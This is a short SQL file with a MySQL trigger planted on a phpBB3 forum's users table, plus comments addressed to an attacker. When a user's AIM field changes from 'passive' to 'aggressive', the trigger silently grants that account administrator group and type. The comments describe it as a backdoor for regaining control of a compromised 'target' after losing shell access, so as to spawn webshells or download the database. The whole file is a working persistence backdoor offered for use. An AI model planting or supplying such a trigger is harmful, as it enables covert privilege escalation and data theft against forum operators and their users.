delimiter #
CREATE TRIGGER update_users BEFORE UPDATE ON phpbb3_users
FOR EACH ROW BEGIN
    IF OLD.user_aim="passive" AND NEW.user_aim="aggressive" THEN
        SET NEW.group_id = 5;
        SET NEW.user_type = 3;
    END IF;
END;#
delimiter ;

-- In order to use this hook, if you lose shell access to your PHPBB3 target
-- then you can change the value for your AIM username to "passive" and then
-- change it again, from "passive" to "aggressive".
-- As soon as this change is detected via the DBMS, it will know to trigger the
-- hook.
-- When the hook gets triggered, it will set your group_id and user_type values 
-- to match the group ID and user type of an admin account, turning your regular
-- PHPBB3 forum account into an admin user, allowing you to acces sthe AdminCP 
-- and spawn new webshells or download the entire database, etc.
